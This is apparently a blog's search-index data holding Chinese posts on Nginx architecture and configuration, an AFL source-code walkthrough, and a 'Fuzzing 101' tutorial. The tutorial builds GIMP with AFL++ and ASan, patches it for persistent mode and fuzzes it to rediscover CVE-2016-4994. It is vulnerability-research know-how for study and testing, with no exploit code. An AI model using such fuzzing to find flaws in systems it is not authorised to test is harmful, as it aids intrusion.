会注册各种时间处理器来处理事件，事件主要来源于网络和磁盘。event 模块负责收集、管理和分发事件，其他的模块都是事件的处理者和消费者，会根据注册的事件得到事件的分发。 在 nginx.conf 的 event{} 块中配置相应的事件模块，就可以启用对应事件模型，而且可以根据应用场景随时切换事件模块。event 模块被核心的 ngx_event_module 管理，它是核心模块。 Nginx 为不同的OS和不同内核版本提供了9个事件模块，分别为：ngx_select_module、ngx_eventport_module、ngx_epoll_module、ngx_poll_module、ngx_devpoll_module、ngx_kqueue_module、ngx_aio_module、ngx_rtsig_module、ngx_select_module(Windows)。 2. 异步多阶段处理 Nginx 把一个请求划分成多个阶段，每个阶段都可以由事件分发器来分发，注册的阶段管理器（handler）进行对应阶段的处理。通俗来将，Nginx的多阶段划分相当于人为创造了很多事件。例如，获取一个静态文件的HTTP请求可以划分为下面的几个阶段： 建立TCP连接阶段：收到TCP的SYN包 开始接收请求：接收到TCP中的ACK包表示连接建立成功 接收到用户请求并分析请求是否完整：接收到用户数据包 接收到完整请求后开始处理：接收到用户数据包 由静态文件读取部分内容：接收到用户数据包或接受到TCP中的ACK包，TCP窗口向前滑动。该过程可能多次触发，直到把文件全部读取 发送完成后：收到最后一个包的ACK 用户主动关闭连接：收到TCP中的FIN报文 每一个事件、每一个阶段均由 event 模块负责调用和激活，event 模块监听系统内核消息，以激活 Nginx 事件。 3. 模块化 Nginx 除了少量的核心代码，其他功能均在模块中实现，新功能的扩展通过标准接口和数据结构开发新模块实现，无需改动核心代码和核心模块，这为 Nginx 带来良好的扩展性和可靠性。 Nginx 设计了6个基础类型模块（称为核心模块），实现了 Nginx 的6个主要部分，以及HTTP协议主流程，分别是： ngx_core_module: 管理配置等全局模块 ngx_events_module: 管理所有事件类型模块 ngx_openssl_module: 管理所有TLS/SSL模块 ngx_http_module: 管理所有HTTP类型模块 ngx_mail_module: 管理所有邮件类型模块 ngx_errlog_module: 管理所有日志类模块 这6个核心模块只是定义了6类业务的业务流程，具体工具并不由这些模块执行，业务核心逻辑及具体请求处理由其下属模块进行实现。 框架程序只需关注如何调用核心模块，Nginx 的核心功能由核心模块完成，实现第一层流水线。核心模块之外是非核心模块，由对应的核心模块进行初始化和调用。非核心模块可以动态添加，通过重新编译包含进 Nginx，通过配置文件将模块使能。 4. 管理进程和工作进程 管理进程作为工作进程的管理进程和父进程，还可以带来高可靠性：工作进程终止，管理进程可以及时启动新的实例接管。这种master + worker的模式具有以下优点： 充分利用多核系统的并发处理能力，Nginx 的所有工作进程都是平等的，并且可以在 nginx.conf 中将工作进程和处理器一一绑定。 负载均衡，工作进程间通过进程间通信实现负载均衡，请求容易被分配到负载较轻的工作进程中。 状态监控，管理进程只负责启动、停止、监控工作进程。 5. 内存池 Nginx 在内部实现了一个简单的内存池，每一个TCP连接建立时都会分配一个内存池，而在请求结束时销毁整个内存池，将之前分配的内存一次性归还给操作系统。Nginx 的内存池并不负责回收已经分配出去的内存，这些内存由请求方负责回收。 6. 连接池 Nginx 为了减少反复创建TCP连接以及创建套接字的次数，从而提高网络响应速度，在内部提供了连接池机制。在Nginx 启动解读哪，管理进程在配置文件中解析出对应的配置，配置项放到配置结构体中。 注：配置指令中 worker_connections 配置的连接池大小是工作进程级别的，所以设计的连接池大小是 worker_connections * worker_processes。 7. 时间缓存 Nginx 为了减少对OS的时间函数 gettimeofday 的调用，自己内部对系统时间进行了缓冲，内部访问时间实际上访问了内存中的几个变量。 8. 延迟关闭 Nginx 在要关闭连接时，并不会立刻关闭连接，而是先关闭TCP连接的写操作，等待一段时间后再关掉连接的读操作。 9. keepalive Nginx 中可以大量看到对 keepalive 的配置和API。 如果客户端的请求头中的 connection 为 close， 表示客户端需要关掉长连接；如果客户端的请求头中的 connection 为 keepalive，表示客户端需要打开长连接；如果没有该子炖啊，则根据协议，如果是 HTTP 1.0 则默认为 close， 如果是 HTTP 1.1 则默认为 keepalive 。 如果为 keepalive ， Nginx 会在输出完响应体后，设置当前连接的 keepalive属性，然后等待客户端的下一次请求。但是不会一直等待，会根据 keepalive_timeout 值决定等待时长。 ","date":"2021-06-07","objectID":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:1:2","tags":["Nginx"],"title":"Nginx核心知识点记录","uri":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"Nginx 的工作流程 ","date":"2021-06-07","objectID":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:2:0","tags":["Nginx"],"title":"Nginx核心知识点记录","uri":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"1. Nginx 的启动流程 启动过程整体上可分为两部分： 框架程序启动过程：创建各核心模块和非核心模块 模块启动过程：模块内部完成自己的启动和初始化 完整的启动流程和各阶段说明如下： 启动时，Nginx 接收命令行参数，解析各主要参数，参数主要存放在 nginx.conf 文件中，所以最重要的参数是nginx.conf的路径； 平滑升级指不重启服务进行升级，不重启管理进程而重启新版本的 Nginx 程序。旧的管理进程先调用 fork 函数创建新进程，然后新进程通过 execve 系统调用启动新版本管理进程，旧版本管理进程手心设置环境变量，新版本管理进程启动时检查对应环境变量判断为平滑升级，并对通过环境变量传递的旧版本 Nginx 服务监听的句柄做继承； 框架通过调用核心模块的 create_conf 方法让核心模块创建用于存储对应配置信息的结构体创建核心模块，然后在后续的步骤中给予配置文件对环境和模块进行初始化，这里主要是为后面的配置文件解析做准备； 调用配置模块的解析方法，解析 nginx.conf 中的配置项，调用对应核心模块的方法将属于各核心模块的配置项保存到核心模块的配置数据结构中； 调用所有核心模块的 init_conf 方法，用于让核心模块根据写入内部配置数据结构的数据对模块做处理和初始化； 配置文件中可能配置了缓存文件、库文件、日志文件等，同时包括共享内存，该步骤对这些文件和共享内存进行创建、打开操作； 对于配置了监听端口的模块，按配置开始监听配置的端口，一般HTTP模块、stream模块都会有监听端口； 调用所有模块的 init_module 方法，使用配置信息初始化模块； 如果 niginx.conf 中配置了 Ngins 为 master 模式，则创建管理进程——master进程； 管理进程根据配置的工作进程数，使用一个循环将所需要的工作进程 fork 出来； 管理进程根据配置解析过程时解析出来的配置信息，检查对应 path 配置是否配置值，如果进行了设置，则 fork 出独立的 cache manager 进程（与工作进程同级），主要作用为将后端服务器的 response 使用文件缓存下来，下次请求时不需要再向后端发送请求，一般用在 upstream{} 中。该进程会定期检查缓存状态、查看缓存总量是否超出限制，如果超出则删除最少使用的部分。此外，还会定期删除过期缓存的文件； 管理进程根据配置解析过程时解析出来的配置信息，检查对应 path 配置是否设置了值，并 fork 出独立的cache loader 进程，并延迟1分钟运行。该进程主要用途是遍历配置文件中 proxy_cache_path 指定的缓存路径中所有的缓存文件，根据缓存文件进行索引重建，即在 Nginx 服务重启之前将之前的缓存文件重建索引； 管理进程调用所有模块的 init_process 方法，此时工作进程的启动工作就完成了，工作进程进入消息循环中开始等待处理用户请求； Nginx 为 single 模式，直接调用所有模块的 init_process 方法，直接启动完毕。单进程模式下，网络端口监听、数据处理等均由管理进程处理，多进程模式下，网络链接和数据处理等由工作进程处理。single 模式一般用于调试。 ","date":"2021-06-07","objectID":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:2:1","tags":["Nginx"],"title":"Nginx核心知识点记录","uri":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"2. 配置加载流程 Nginx 服务通过 nginx.conf 配置文件实现，因为 Nginx 为多模块架构，在框架启动流程中，每个模块都会为自己创建一个配置信息数据结构，而框架又会调用模块 init_conf 接口，将配置项加载到模块一级。所有配置项中的配置以配置块为单位，而配置块又是与内部模块对应的。 1. 配置文件详解 这里给出一个 nginx.conf 的详细解析： #全局块 #user nobody; worker_processes 1; #event块 events { worker_connections 1024; } #http块 http { #http全局块 include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; #server块 server { #server全局块 listen 8000; server_name localhost; #location块 location / { root html; index index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } #这边可以有多个server块 server { ... } } 对该文件的各个部分的详细说明如下： 1. 全局块 全局块是默认配置文件从开始到 events 块之间的一部分内容，主要设置一些影响 Nginx 服务器整体运行的配置指令，因此，这些指令的作用域是 Nginx 服务器全局。 通常包括配置运行 Nginx 服务器的用户（组）、允许生成的 worker process 数、Nginx 进程 PID 存放路径、日志的存放路径和类型以及配置文件引入等。 # 指定可以运行nginx服务的用户和用户组，只能在全局块配置 # user [user] [group] # 将user指令注释掉，或者配置成nobody的话所有用户都可以运行 # user nobody nobody; # user指令在Windows上不生效，如果你制定具体用户和用户组会报小面警告 # nginx: [warn] \"user\" is not supported, ignored in D:\\software\\nginx-1.18.0/conf/nginx.conf:2 # 指定工作线程数，可以制定具体的进程数，也可使用自动模式，这个指令只能在全局块配置 # worker_processes number | auto； # 列子：指定4个工作线程，这种情况下会生成一个master进程和4个worker进程 # worker_processes 4; # 指定pid文件存放的路径，这个指令只能在全局块配置 # pid logs/nginx.pid; # 指定错误日志的路径和日志级别，此指令可以在全局块、http块、server块以及location块中配置。(在不同的块配置有啥区别？？) # 其中debug级别的日志需要编译时使用--with-debug开启debug开关 # error_log [path] [debug | info | notice | warn | error | crit | alert | emerg] # error_log logs/error.log notice; # error_log logs/error.log info; 2. events 块 events 块涉及的指令主要影响 Nginx 服务器与用户的网络连接。常用到的设置包括是否开启对多 worker process 下的网络连接进行序列化，是否允许同时接收多个网络连接，选取哪种事件驱动模型处理连接请求，每个 worker process 可以同时支持的最大连接数等。 这一部分的指令对 Nginx 服务器的性能影响较大，在实际配置中应该根据实际情况灵活调整。 3. http 块 http 块是 Nginx 服务器配置中的重要部分，代理、缓存和日志定义等绝大多数的功能和第三方模块的配置都可以放在这个模块中。 前面已经提到，http 块中可以包含自己的全局块，也可以包含 server 块，server 块中又可以进一步包含 location 块，在本书中我们使用 “http 全局块” 来表示 http 中自己的全局块，即 http 块中不包含在 server 块中的部分。 可以在 http 全局块中配置的指令包括文件引入、MIME-Type 定义、日志自定义、是否使用 sendfile 传输文件、连接超时时间、单连接请求数上限等。 # 常用的浏览器中，可以显示的内容有HTML、XML、GIF及Flash等种类繁多的文本、媒体等资源，浏览器为区分这些资源，需要使用MIME Type。换言之，MIME Type是网络资源的媒体类型。Nginx服务器作为Web服务器，必须能够识别前端请求的资源类型。 # include指令，用于包含其他的配置文件，可以放在配置文件的任何地方，但是要注意你包含进来的配置文件一定符合配置规范，比如说你include进来的配置是worker_processes指令的配置，而你将这个指令包含到了http块中，着肯定是不行的，上面已经介绍过worker_processes指令只能在全局块中。 # 下面的指令将mime.types包含进来，mime.types和ngin.cfg同级目录，不同级的话需要指定具体路径 # include mime.types; # 配置默认类型，如果不加此指令，默认值为text/plain。 # 此指令还可以在http块、server块或者location块中进行配置。 # default_type application/octet-stream; # access_log配置，此指令可以在http块、server块或者location块中进行设置 # 在全局块中，我们介绍过errer_log指令，其用于配置Nginx进程运行时的日志存放和级别，此处所指的日志与常规的不同，它是指记录Nginx服务器提供服务过程应答前端请求的日志 # access_log path [format [buffer=size]] # 如果你要关闭access_log,你可以使用下面的命令 # access_log off; # log_format指令，用于定义日志格式，此指令只能在http块中进行配置 # log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; # 定义了上面的日志格式后，可以以下面的形式使用日志 # access_log logs/access.log main; # 开启关闭sendfile方式传输文件，可以在http块、server块或者location块中进行配置 # sendfile on | off; # 设置sendfile最大数据量,此指令可以在http块、server块或location块中配置 # sendfile_max_chunk size; # 其中，size值如果大于0，Nginx进程的每个worker process每次调用sendfile()传输的数据量最大不能超过这个值(这里是128k，所以每次不能超过128k)；如果设置为0，则无限制。默认值为0。 # sendfile_max_chunk 128k; # 配置连接超时时间,此指令可以在http块、server块或location块中配置。 # 与用户建立会话连接后，Nginx服务器可以保持这些连接打开一段时间 # timeout，服务器端对连接的保持时间。默认值为75s;header_timeout，可选项，在应答报文头部的Keep-Alive域设置超时时间：“Keep-Alive:timeout= header_timeout”。报文中的这个指令可以被Mozilla或者Konqueror识别。 # keepalive_timeout timeout [header_timeout] # 下面配置的含义是，在服务器端保持连接的时间设置为120 s，发给用户端的应答报文头部中Keep-Alive域的超时时间设置为100 s。 # keepalive_timeout 120s 100s # 配置单连接请求数上限，此指令可以在http块、server块或location块中配置。 # Nginx服务器端和用户端建立会话连接后，用户端通过此连接发送请求。指令keepalive_requests用于限制用户通过某一连接向Nginx服务器发送请求的次数。默认是100 # keepalive_requests number; 4. server 块 server 块和 “虚拟主机” 的概念有密切联系。 虚拟主机，又称虚拟服务器、主机空间或是网页空间，它是一种技术。该技术是为了节省互联网服务器硬件成本而出现的。这里的 “主机” 或“空间”是由实体的服务器延伸而来，硬件系统可以基于服务器群，或者单个服务器等。虚拟主机技术主要应用","date":"2021-06-07","objectID":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:2:2","tags":["Nginx"],"title":"Nginx核心知识点记录","uri":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"参考文献 Nginx 官网 操作系统能否支持百万连接? Nginx 系列博客 nginx 的 default_server 定义及匹配规则 W3C Nginx 教程 https://www.cnblogs.com/54chensongxia/p/12938929.html ","date":"2021-06-07","objectID":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:3:0","tags":["Nginx"],"title":"Nginx核心知识点记录","uri":"/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 6","date":"2021-01-18","objectID":"/fuzzing101-6/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/fuzzing101-6/"},{"categories":["Fuzz"],"content":"本文是Fuzzing101系列第六篇，fuzz的对象为 GIMP 。 ","date":"2021-01-18","objectID":"/fuzzing101-6/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/fuzzing101-6/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics GIMP CVE-2016-4994 7hous persistent mode CVE-2016-4994: Use-After-Free vulneratibily. ","date":"2021-01-18","objectID":"/fuzzing101-6/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/fuzzing101-6/"},{"categories":["Fuzz"],"content":"2. Learning Target 使用 fuzz 的 persistent mode 对 interactive/GUI 应用程序进行fuzz ","date":"2021-01-18","objectID":"/fuzzing101-6/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/fuzzing101-6/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2021-01-18","objectID":"/fuzzing101-6/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/fuzzing101-6/"},{"categories":["Fuzz"],"content":"1. Workflow 找到一种修改 GIMP 源码以启用 AFL++ 的 persistent mode 的有效的方法 创建一个 XCF 的语料库 对 XCF 文件格式创建 dictionary 开始fuzz，直到出现crash 使用造成crash的poc重现crash 修复漏洞 ","date":"2021-01-18","objectID":"/fuzzing101-6/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/fuzzing101-6/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先创建待 fuzz 的 GIMP 环境，进行编译待用。 这里首先要安装 GEGL 0.2(Generic Graphics Library)，使用源码编译： # install dependencies sudo apt install build-essential libatk1.0-dev libfontconfig1-dev libcairo2-dev libgudev-1.0-0 libdbus-1-dev libdbus-glib-1-dev libexif-dev libxfixes-dev libgtk2.0-dev python2.7-dev libpango1.0-dev libglib2.0-dev zlib1g-dev intltool libbabl-dev # download and uncompress wget https://download.gimp.org/pub/gegl/0.2/gegl-0.2.2.tar.bz2 tar xvf gegl-0.2.0.tar.bz2 \u0026\u0026 cd gegl-0.2.2 # modify the source code sed -i 's/CODEC_CAP_TRUNCATED/AV_CODEC_CAP_TRUNCATED/g' ./operations/external/ff-load.c sed -i 's/CODEC_FLAG_TRUNCATED/AV_CODEC_FLAG_TRUNCATED/g' ./operations/external/ff-load.c # build and install ./configure --enable-debug --disable-glibtest --without-vala --without-cairo --without-pango --without-pangocairo --without-gdk-pixbuf --without-lensfun --without-libjpeg --without-libpng --without-librsvg --without-openexr --without-sdl --without-libopenraw --without-jasper --without-graphviz --without-lua --without-libavformat --without-libv4l --without-libspiro --without-exiv2 --without-umfpack make -j$(nproc) sudo make install 然后，下载 GIMP 2.8.16，并进行编译安装： # download cd .. wget https://mirror.klaus-uwe.me/gimp/pub/gimp/v2.8/gimp-2.8.16.tar.bz2 tar xvf gimp-2.8.16.tar.bz2 \u0026\u0026 cd gimp-2.8.16/ # build and install CC=afl-clang-lto CXX=afl-clang-lto++ PKG_CONFIG_PATH=$PKG_CONFIG_PATH:$HOME/Desktop/Fuzz/training/fuzzing_gimp/gegl-0.2.2/ CFLAGS=\"-fsanitize=address\" CXXFLAGS=\"-fsanitize=address\" LDFLAGS=\"-fsanitize=address\" ./configure --disable-gtktest --disable-glibtest --disable-alsatest --disable-nls --without-libtiff --without-libjpeg --without-bzip2 --without-gs --without-libpng --without-libmng --without-libexif --without-aa --without-libxpm --without-webkit --without-librsvg --without-print --without-poppler --without-cairo-pdf --without-gvfs --without-libcurl --without-wmf --without-libjasper --without-alsa --without-gudev --disable-python --enable-gimp-console --without-mac-twain --without-script-fu --without-gudev --without-dbus --disable-mp --without-linux-input --without-xvfb-run --with-gif-compression=none --without-xmc --with-shm=none --enable-debug --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_gimp/gimp-2.8.16/install\" make -j$(nproc) make install 2. persistent mode 为了使用 AFL++ 的 persistent mode，我们需要对源码进行一定的修改： 第一种方案是修改 app.c 文件： 第二种方案是修改 xcf_load_invoker 函数： 这里我们直接采用第二种方案进行 patch。gimp-2.8.16/app/xcf/xcf.c 修改前内容如下： 补丁内容如下： --- ../xcf.c 2014-08-20 08:27:58.000000000 -0700 +++ ./app/xcf/xcf.c 2021-10-11 13:02:42.800831192 -0700 @@ -277,6 +277,10 @@ filename = g_value_get_string (\u0026args-\u003evalues[1]); +#ifdef __AFL_COMPILER + while(__AFL_LOOP(10000)){ +#endif + info.fp = g_fopen (filename, \"rb\"); if (info.fp) @@ -366,6 +370,12 @@ if (success) gimp_value_set_image (\u0026return_vals-\u003evalues[1], image); +#ifdef __AFL_COMPILER + } +#endif + + exit(0); + gimp_unset_busy (gimp); return return_vals; 使用上面的补丁修改 gimp-2.8.16/app/xcf/xcf.c 文件： patch gimp-2.8.16/app/xcf/xcf.c -i persistent.patch pacth 后的文件内容如下： 这样就可以实现 AFL++ 的 persistent mode。 3. Seed corpus creation 这里直接使用 SampleInput.xcf 做简单的语料样例。 4. Custom dictionary 这里直接使用AFL++提供的 xcf 的 dict 。 4. Fuzzing 执行 afl-fuzz ，采用并行方式进行fuzz: ASAN_OPTIONS=detect_leaks=0,abort_on_error=1,symbolize=0 afl-fuzz -i './afl_in' -o './afl_out' -D -t 100 -- ./gimp-2.8.16/app/gimp-console-2.8 --verbose -d -f @@ ","date":"2021-01-18","objectID":"/fuzzing101-6/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/fuzzing101-6/"},{"categories":["Fuzz"],"content":"3. Crashes ","date":"2021-01-18","objectID":"/fuzzing101-6/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/fuzzing101-6/"},{"categories":["Fuzz"],"content":"4. Triage ","date":"2021-01-18","objectID":"/fuzzing101-6/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/fuzzing101-6/"},{"categories":["Fuzz"],"content":"5. Fix 官方的修复地址： https://gitlab.gnome.org/GNOME/gimp/-/commit/6d804bf9ae77bc86a0a97f9b944a129844df9395 后续将对该漏洞进行深入分析和补丁分析，待完善。 ","date":"2021-01-18","objectID":"/fuzzing101-6/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/fuzzing101-6/"},{"categories":["Fuzz"],"content":"AFL二三事系列 note 3","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"本文是AFL系列第四篇，主要介绍AFL的源码分析。 AFL二三事——源码分析 ","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:0:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"前言 AFL，全称“American Fuzzy Lop”，是由安全研究员Michal Zalewski开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率（代码执行路径的覆盖情况），以此进行反馈，对输入样本进行调整以提高覆盖率，从而提升发现漏洞的可能性。AFL可以针对有源码和无源码的程序进行模糊测试，其设计思想和实现方案在模糊测试领域具有十分重要的意义。 深入分析AFL源码，对理解AFL的设计理念和其中用到的技巧有着巨大的帮助，对于后期进行定制化Fuzzer开发也具有深刻的指导意义。所以，阅读AFL源码是学习AFL必不可少的一个关键步骤。 （注：需要强调的是，本文的主要目的是协助fuzz爱好者阅读AFL的源码，所以需要在了解AFL基本工作流程和原理的前提下进行阅读，本文并不会在原理侧做过多说明。） 当别人都要快的时候，你要慢下来。 ","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:1:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"宏观 首先在宏观上看一下AFL的源码结构： 主要的代码在 afl-fuzz.c 文件中，然后是几个独立模块的实现代码，llvm_mode 和 qemu_mode 的代码量大致相当，所以分析的重点应该还是在AFL的根目录下的几个核心功能的实现上，尤其是 afl-fuzz.c，属于核心中的重点。 各个模块的主要功能和作用的简要说明： 插桩模块 afl-as.h, afl-as.c, afl-gcc.c：普通插桩模式，针对源码插桩，编译器可以使用gcc， clang； llvm_mode：llvm 插桩模式，针对源码插桩，编译器使用clang； qemu_mode：qemu 插桩模式，针对二进制文件插桩。 fuzzer 模块 afl-fuzz.c：fuzzer 实现的核心代码，AFL 的主体。 其他辅助模块 afl-analyze：对测试用例进行分析，通过分析给定的用例，确定是否可以发现用例中有意义的字段； afl-plot：生成测试任务的状态图； afl-tmin：对测试用例进行最小化； afl-cmin：对语料库进行精简操作； afl-showmap：对单个测试用例进行执行路径跟踪； afl-whatsup：各并行例程fuzzing结果统计； afl-gotcpu：查看当前CPU状态。 部分头文件说明 alloc-inl.h：定义带检测功能的内存分配和释放操作； config.h：定义配置信息； debug.h：与提示信息相关的宏定义； hash.h：哈希函数的实现定义； types.h：部分类型及宏的定义。 ","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:2:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"一、AFL的插桩——普通插桩 ","date":"0001-01-01","objectID":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:3:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"（一） 、AFL 的 gcc —— afl-gcc.c 1. 概述 afl-gcc 是GCC 或 clang 的一个wrapper（封装），常规的使用方法是在调用 ./configure 时通过 CC 将路径传递给 afl-gcc 或 afl-clang。（对于 C++ 代码，则使用 CXX 并将其指向 afl-g++ / afl-clang++。）afl-clang, afl-clang++， afl-g++ 均为指向 afl-gcc 的一个符号链接。 afl-gcc 的主要作用是实现对于关键节点的代码插桩，属于汇编级，从而记录程序执行路径之类的关键信息，对程序的运行情况进行反馈。 2. 源码 1. 关键变量 在开始函数代码分析前，首先要明确几个关键变量： static u8* as_path; /* Path to the AFL 'as' wrapper，AFL的as的路径 */ static u8** cc_params; /* Parameters passed to the real CC，CC实际使用的编译器参数 */ static u32 cc_par_cnt = 1; /* Param count, including argv0 ，参数计数 */ static u8 be_quiet, /* Quiet mode，静默模式 */ clang_mode; /* Invoked as afl-clang*? ，是否使用afl-clang*模式 */ # 数据类型说明 # typedef uint8_t u8; # typedef uint16_t u16; # typedef uint32_t u32; 2. main函数 main 函数全部逻辑如下： 其中主要有如下三个函数的调用： find_as(argv[0]) ：查找使用的汇编器 edit_params(argc, argv)：处理传入的编译参数，将确定好的参数放入 cc_params[] 数组 调用 execvp(cc_params[0], (cahr**)cc_params) 执行 afl-gcc 这里添加了部分代码打印出传入的参数 arg[0] - arg[7] ，其中一部分是我们指定的参数，另外一部分是自动添加的编译选项。 3. find_as 函数 函数的核心作用：寻找 afl-as 函数内部大概的流程如下（软件自动生成，控制流程图存在误差，但关键逻辑没有问题）： 首先检查环境变量 AFL_PATH ，如果存在直接赋值给 afl_path ，然后检查 afl_path/as 文件是否可以访问，如果可以，as_path = afl_path。 如果不存在环境变量 AFL_PATH ，检查 argv[0] （如“/Users/v4ler1an/AFL/afl-gcc”）中是否存在 “/” ，如果存在则取最后“/” 前面的字符串作为 dir，然后检查 dir/afl-as 是否可以访问，如果可以，将 as_path = dir 。 以上两种方式都失败，抛出异常。 4. edit_params 函数 核心作用：将 argv 拷贝到 u8 **cc_params ，然后进行相应的处理。 函数内部的大概流程如下： 调用 ch_alloc() 为 cc_params 分配大小为 (argc + 128) * 8 的内存（u8的类型为1byte无符号整数） 检查 argv[0] 中是否存在/，如果不存在则 name = argv[0]，如果存在则一直找到最后一个/，并将其后面的字符串赋值给 name 对比 name和固定字符串afl-clang： 若相同，设置clang_mode = 1，设置环境变量CLANG_ENV_VAR为1 对比name和固定字符串afl-clang++:： 若相同，则获取环境变量AFL_CXX的值，如果存在，则将该值赋值给cc_params[0]，否则将afl-clang++赋值给cc_params[0]。这里的cc_params为保存编译参数的数组； 若不相同，则获取环境变量AFL_CC的值，如果存在，则将该值赋值给cc_params[0]，否则将afl-clang赋值给cc_params[0]。 如果不相同，并且是Apple平台，会进入 #ifdef __APPLE__。在Apple平台下，开始对 name 进行对比，并通过 cc_params[0] = getenv(\"\") 对cc_params[0]进行赋值；如果是非Apple平台，对比 name 和 固定字符串afl-g++（此处忽略对Java环境的处理过程）： 若相同，则获取环境变量AFL_CXX的值，如果存在，则将该值赋值给cc_params[0]，否则将g++赋值给cc_params[0]； 若不相同，则获取环境变量AFL_CC的值，如果存在，则将该值赋值给cc_params[0]，否则将gcc赋值给cc_params[0]。 进入 while 循环，遍历从argv[1]开始的argv参数： 如果扫描到 -B ，-B选项用于设置编译器的搜索路径，直接跳过。（因为在这之前已经处理过as_path了）； 如果扫描到 -integrated-as，跳过； 如果扫描到 -pipe，跳过； 如果扫描到 -fsanitize=address 和 -fsanitize=memory 告诉 gcc 检查内存访问的错误，比如数组越界之类，设置 asan_set = 1； 如果扫描到 FORTIFY_SOURCE ，设置 fortify_set = 1 。FORTIFY_SOURCE 主要进行缓冲区溢出问题的检查，检查的常见函数有memcpy, mempcpy, memmove, memset, strcpy, stpcpy, strncpy, strcat, strncat, sprintf, vsprintf, snprintf, gets 等； 对 cc_params 进行赋值：cc_params[cc_par_cnt++] = cur; 跳出 while 循环，设置其他参数： 取出前面计算出的 as_path ，设置 -B as_path ； 如果为 clang_mode ，则设置-no-integrated-as； 3. 如果存在环境变量 AFL_HARDEN，则设置-fstack-protector-all。且如果没有设置 fortify_set ，追加 -D_FORTIFY_SOURCE=2 ； sanitizer相关，通过多个if进行判断： 如果 asan_set 在前面被设置为1，则设置环境变量 AFL_USE_ASAN 为1； 如果 asan_set 不为1且，存在 AFL_USE_ASAN 环境变量，则设置 -U_FORTIFY_SOURCE -fsanitize=address； 如果不存在 AFL_USE_ASAN 环境变量，但存在 AFL_USE_MSAN 环境变量，则设置-fsanitize=memory（不能同时指定AFL_USE_ASAN或者AFL_USE_MSAN，也不能同时指定 AFL_USE_MSAN 和 AFL_HARDEN，因为这样运行时速度过慢； 如果不存在 AFL_DONT_OPTIMIZE 环境变量，则设置-g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1； 如果存在 AFL_NO_BUILTIN 环境变量，则表示允许进行优化，设置-fno-builtin-strcmp -fno-builtin-strncmp -fno-builtin-strcasecmp -fno-builtin-strncasecmp -fno-builtin-memcmp -fno-builtin-strstr -fno-builtin-strcasestr。 最后补充cc_params[cc_par_cnt] = NULL;，cc_params 参数数组编辑完成。 ###（二）、AFL的插桩 —— afl-as.c 1. 概述 afl-gcc 是 GNU as 的一个wrapper（封装），唯一目的是预处理由 GCC/clang 生成的汇编文件，并注入包含在 afl-as.h 中的插桩代码。 使用 afl-gcc / afl-clang 编译程序时，工具链会自动调用它。该wapper的目标并不是为了实现向 .s 或 asm  代码块中插入手写的代码。 experiment/clang_asm_normalize/ 中可以找到可能允许 clang 用户进行手动插入自定义代码的解决方案，GCC并不能实现该功能。 2. 源码 1. 关键变量 在开始函数代码分析前，首先要明确几个关键变量： static u8** as_params; /* Parameters passed to the real 